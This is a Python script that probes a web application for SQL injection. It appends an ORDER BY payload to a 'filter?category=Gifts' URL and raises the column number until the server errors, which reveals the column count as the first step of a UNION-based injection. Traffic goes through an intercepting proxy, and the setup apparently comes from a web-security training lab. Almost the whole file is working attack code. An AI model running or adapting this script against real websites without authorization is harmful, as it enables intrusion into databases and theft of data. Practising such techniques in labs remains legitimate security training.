import requests
import sys
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# The script when run will pass through the below proxy settings
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

"""
    Function to determine the number of columns in a SQL query via SQL Injection.
    
    :param url: The target URL vulnerable to SQL Injection.
    :param sqli_payload: The SQL Injection payload to be used.
    :param proxies: Optional proxies for the requests.
    :return: The number of columns if found, otherwise None.
"""
def exploit_sqli_get_column_count(url, sqli_payload, use_proxy=True):
    """Determine the number of columns by incrementing ORDER BY until the server errors.

    If `use_proxy` is True the configured `proxies` dict is used; if the proxy fails the
    function falls back to a direct connection automatically.
    """
    path = "filter?category=Gifts"
    for i in range(1, 51):  # Testing for column counts from 1 to 50
        test_payload = f"{sqli_payload}{i}-- "
        full_url = f"{url}{path}{test_payload}"

        # Try with proxy if requested
        if use_proxy:
            try:
                response = requests.get(full_url, verify=False, proxies=proxies)
            except requests.exceptions.RequestException as e:
                print(f"[!] Request failed using proxy: {e}")
                # Fallback to direct connection
                try:
                    response = requests.get(full_url, verify=False)
                    print("[i] Fallback: connected without proxy.")
                except requests.exceptions.RequestException as e2:
                    print(f"[!] Direct connection failed as well: {e2}")
                    return None
        else:
            try:
                response = requests.get(full_url, verify=False)
            except requests.exceptions.RequestException as e:
                print(f"[!] Direct connection failed: {e}")
                return None

        if response.status_code != 200:
            return i - 1  # Return the last successful column count
        
    return None  # If no errors were encountered, return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Detect number of columns via ORDER BY SQLi.")
    parser.add_argument("url", help="Base URL (e.g. https://example.com/)")
    parser.add_argument("--no-proxy", dest="no_proxy", action="store_true",
                        help="Do not use the configured proxy (connect directly)")
    args = parser.parse_args()

    url = args.url.strip()
    print("[+] Figuring out number of columns...")
    sqli_payload = "'+order+by+"
    num_columns = exploit_sqli_get_column_count(url, sqli_payload, use_proxy=not args.no_proxy)
    print(num_columns)
    if num_columns:
        print("[+] The site appears to be vulnerable to SQL Injection, and the number of columns are: %d" % num_columns)
    else:
        print("[+] The site does not appear to be vulnerable to SQL Injection.")